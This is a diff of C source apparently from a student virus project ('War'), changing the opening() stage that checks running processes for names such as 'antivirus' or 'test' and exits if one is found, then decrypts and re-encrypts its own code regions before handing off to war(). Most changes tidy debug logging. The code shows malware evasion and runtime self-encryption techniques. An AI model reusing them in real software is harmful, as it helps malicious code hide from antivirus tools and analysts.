@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 15:33:40 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 20:44:18 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,8 +18,7 @@
   if the process is found then War abort as soon as possible.
   i'm deeply sorry about how ugly opening() is :(
 */
-
-__INLINE__ bool read_entry(int fd)
+__INLINE__ static bool read_entry(int fd)
 {
 	char	prog[PROG_INFO] = {0};
 	char	needle[PROG_ENTRY][16] = {"antivirus", "test"};
@@ -34,11 +33,8 @@ __INLINE__ bool read_entry(int fd)
 			if (_strncmp(needle[count], &prog[count2], _strlen(needle[count])) == 0)
 			{
 				#ifdef DEBUG
-				char c = '\n';
-				char tutu[] = "\tproccess :\t";
-				_log(tutu, _strlen(tutu));
-				_log(&prog[count2], _strlen(&prog[count2]));
-				_log(&c, 1);
+				char log[] = "\tProccess found : ";
+				_log(log, &prog[count2], 18, 0);
 				#endif
 				return (true);
 			}
@@ -51,9 +47,8 @@ void	opening(t_data *data)
 {
 
 #ifdef DEBUG
-	char de[] = "opening\t\t0\n";
-	data->context == true ?	de[9] = 49 : 0;
-	_log(de, _strlen(de));
+	char log[] = "opening\t\t";
+	_log(log, NULL, 9, data->context);
 #endif
 
 	revert_one(&data->key, (char*)antidebug, (size_t)opening - (size_t)antidebug);
@@ -91,7 +86,6 @@ void	opening(t_data *data)
 			}
 		}
 	}
-	_close(fd[0]);
 	data->context = true;
 
 next:
@@ -101,6 +95,5 @@ next:
 
 	update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening);
 	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
-
 	war(data);
 }
